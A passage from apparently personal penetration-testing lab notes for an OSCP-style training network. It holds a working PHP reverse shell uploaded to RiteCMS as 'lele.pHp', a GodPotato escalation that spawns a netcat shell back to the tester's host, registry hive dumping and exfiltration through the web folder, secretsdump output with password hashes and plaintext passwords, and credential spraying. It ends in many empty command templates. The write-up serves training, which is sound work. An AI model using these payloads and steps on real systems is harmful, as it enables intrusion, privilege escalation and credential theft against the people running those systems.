    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.45.152', 1234);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="directory"

files
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="file_name"

lele.pHp
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="overwrite_file"

true
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="upload_mode"

1
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="resize_xy"

x
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="resize"

640
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="compression"

80
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="thumbnail_resize_xy"

x
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="thumbnail_resize"

150
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="thumbnail_compression"

70
-----------------------------96439023227315354721360425105
Content-Disposition: form-data; name="upload_file_submit"

OK - Upload file
-----------------------------96439023227315354721360425105--


```

Following the instructions from https://www.exploit-db.com/exploits/50616. to achieve execution, we need to remove the .htaccess file.

Set a listener in our kali attacker machine and trigger execution with:

```txt
http://ritecms.com:8000/cms/files/lele.php
```

Whoami and we are legacy/adrian. We print the local.txt


```bash
type c:\Users\Adrian\Desktop\local.txt
```


### proof.txt

Now we list privs

```
whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

Easy.

Download the binaries from the release folder at: [https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeImpersonatePrivilege/GodPotato/releases)

Example of privilege escalation in oscp-relia:

```
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.152 5555 -e cmd.exe"
```

Now proof is at c:\Users\damon\Desktop>proof.txt

Perfect.

Another way:

```
type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Output:

```
ipconfig
hostname
echo "Let's check if this script works running as damon and password i6yuT6tym@"
echo "Don't forget to clear history once done to remove the password!"
Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s

```


### Post exploitation

As system admin we dump the hives with:

```cmd-session
reg.exe save hklm\sam C:\sam.save

reg.exe save hklm\system C:\system.save

reg.exe save hklm\security C:\security.save
```


Then we copy paste them into the xampp server:

```
copy sam.save c:\xampp\htdocs\cms\files\sam.save
copy security.save c:\xampp\htdocs\cms\files\security.save
copy system.save c:\xampp\htdocs\cms\files\system.save
```

And download them to our kali via:

```
http://ritecms.com:8000/cms/files/security.save
```

Then 

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Output: 

```text
[*] Target system bootKey: 0x64739ab3729cd3b69b8a2112d7f813bd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:387aef0561b65e4f3cae0960b0fba2d5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1ab23de33bb51f7526de86958813cc52:::
damon:1003:aad3b435b51404eeaad3b435b51404ee:820d6348890893116880101307197052:::
adrian:1004:aad3b435b51404eeaad3b435b51404ee:e3cea06e2de8d54d43b84d4b5bffb5b0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x783f09188d2af2381f7d601ff03c1d2deb2d665a
dpapi_userkey:0xcd8285ba48e3c7dc6b39c47fe53d0c9419605ad5
[*] NL$KM 
 0000   53 D8 DF B0 D7 9C 7F D9  36 F1 AF 1C EE E0 66 A0   S.......6.....f.
 0010   24 5E BB 0F DC 2D 24 EA  71 8F 4F 4E 57 8C 23 6C   $^...-$.q.ONW.#l
 0020   5C 27 DB 63 12 27 CA 5B  2F C0 29 69 9E AC 99 DE   \'.c.'.[/.)i....
 0030   A7 A1 16 3D AD FA E0 E5  45 67 2D 33 86 24 A1 2E   ...=....Eg-3.$..
NL$KM:53d8dfb0d79c7fd936f1af1ceee066a0245ebb0fdc2d24ea718f4f4e578c236c5c27db631227ca5b2fc029699eac99dea7a1163dadfae0e545672d338624a12e
[*] _SC_Apache2.4 
(Unknown User):RosemaryBush1!
[*] Cleaning up... 


```

More things. Accessing as damon

```
evil-winrm -i 192.168.151.249 -u 'damon' -p 'i6yuT6tym@'
```

Note:

```
dir c:\Users\damon\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        10/20/2022   1:49 AM                3D Objects
d-r---        10/20/2022   1:49 AM                Contacts
d-r---        12/29/2025   8:04 AM                Desktop
d-r---        10/20/2022   1:49 AM                Documents
d-r---        10/20/2022   1:49 AM                Downloads
d-r---        10/20/2022   1:49 AM                Favorites
d-r---        10/20/2022   1:49 AM                Links
d-r---        10/20/2022   1:49 AM                Music
d-r---        10/20/2022   1:49 AM                Pictures
d-r---        10/20/2022   1:49 AM                Saved Games
d-r---        10/20/2022   1:49 AM                Searches
d-r---        10/20/2022   1:49 AM                Videos
-a----        10/20/2022   2:22 AM              0 .bash_history
-a----        10/20/2022   2:06 AM             69 .gitconfig
-a----        10/20/2022   2:07 AM             20 .lesshst
```

See the file .gitconfig:

```
type c:\Users\damon\.gitconfig
[safe]
        directory = C:/staging
[user]
        email = damian
        name = damian
```

So go to the git env at c:\staging

```
PS C:\staging> dir -force


    Directory: C:\staging


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--h--        12/29/2025  12:02 PM                .git
d-----        10/20/2022   1:57 AM                htdocs
```

Then, show the last commit:

```
git.exe show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file

```

Bingo:  maildmz@relia.com:DPuBT9tGCBrTbR

## [ ENTRY  COMPROMISED  1 ] WINPREP - 192.168.151.250 

CREDENTIALS offsec / lab
Command:

```bash
nmap -sC -sV 192.168.151.250
```

Output:

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:24 EST
Nmap scan report for 192.168.151.250
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-21T17:51:04+00:00; +26m01s from scanner time.
| ssl-cert: Subject: commonName=WINPREP
| Not valid before: 2025-11-16T06:28:25
|_Not valid after:  2026-05-18T06:28:25
| rdp-ntlm-info: 
|   Target_Name: WINPREP
|   NetBIOS_Domain_Name: WINPREP
|   NetBIOS_Computer_Name: WINPREP
|   DNS_Domain_Name: WINPREP
|   DNS_Computer_Name: WINPREP
|   Product_Version: 10.0.22000
|_  System_Time: 2025-12-21T17:50:56+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-12-21T17:50:58
|_  start_date: N/A
|_clock-skew: mean: 26m00s, deviation: 0s, median: 26m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
```


```
xfreerdp3 /v:$WINPREP  /u:offsec /p:lab /cert:ignore  
```

Checks privs:

```
whoami /priv
whoami /groups
net localgroup Administrator
```



Tried SMB, WINRM, RDP
```bash
crackmapexec smb 192.168.151.245-250 -u offsec -p 'lab'  --continue-on-success

SMB         192.168.151.250 445    WINPREP          [+] WINPREP\offsec:lab
SMB         192.168.151.248 445    EXTERNAL         [+] EXTERNAL\offsec:lab 

```

Output:

```
SMB         192.168.151.247 445    WEB02            [-] WEB02\offsec:lab STATUS_LOGON_FAILURE 
SMB         192.168.151.250 445    WINPREP          [+] WINPREP\offsec:lab 
SMB         192.168.151.249 445    LEGACY           [-] LEGACY\offsec:lab STATUS_LOGON_FAILURE 
SMB         192.168.151.248 445    EXTERNAL         [+] EXTERNAL\offsec:lab 
```


Now we continue in machine 13.




## NO VM - 192.168.151.254

```bash

Nmap scan report for 192.168.151.254
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp filtered ssh
53/tcp open     domain

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```

